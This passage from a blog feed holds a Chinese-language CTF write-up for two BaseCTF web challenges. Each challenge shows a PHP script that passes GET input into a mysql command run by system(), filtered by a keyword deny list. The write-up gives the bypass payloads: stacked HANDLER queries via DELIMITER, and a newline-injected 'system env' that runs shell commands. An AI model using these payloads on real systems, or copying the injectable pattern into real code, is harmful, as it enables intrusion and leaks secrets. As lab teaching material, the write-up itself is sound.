title="Basectf Sql Inject or RCE"></a>Basectf <strong><strong>Sql Inject or RCE</strong></strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query);</span><br></pre></td></tr></table></figure><p>system被过滤，无法再像上面那题一样进行命令执行，但我们发现sql注入过滤中的del变成了delete，用我们的小脑瓜想一想，这道题还是考察sql注入<br>select被过滤，那可以用handler来进行堆叠注入，然而分号也被过滤。<br>但是mysql中有一个关键字叫DELIMITER，它可以改变语句结束的分隔符，可以将分号改成其他<br>因此我们就可以对此进行堆叠注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sql=%0ADELIMITER m%0Ahandler flag openm%0Ahandler flag read nextm</span><br></pre></td></tr></table></figure><h3 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/se|ec|;|@|del|into|outfile/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query);</span><br></pre></td></tr></table></figure><p>这里del into select这些都没法用了，sql注入是不太现实了<br>同时他题目的提示也给到了我们RCE，mysql远程连接和命令行操作，和让我们输入一个问号。<br>这道题可能是考察mysql命令行中的一些操作<br>在mysql命令行中输入?试试</p><p>可以发现里面有一个system，可以通过mysql命令行直接执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;mysql -u root -p123456 -e &quot;use ctf;select &#x27;ctfer! You can\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;&quot;&quot;;</span><br><span class="line">我们发现这里面有个-- ，也就是注释符，因此我们还需要绕过一下注释</span><br><span class="line">%0a换行即可绕过</span><br><span class="line">env:查看所有环境变量</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0asystem env</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;sql注入相关命令介绍&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;1-sql相关查询命令&quot;&gt;&lt;a href=&quot;#1-sql相关查询命令&quot; class=&quot;headerlink&quot; title=&quot;1.sql相关查询命令&quot;&gt;&lt;/a&gt;1.sql相关</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="sql注入" scheme="http://1768161086.github,io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
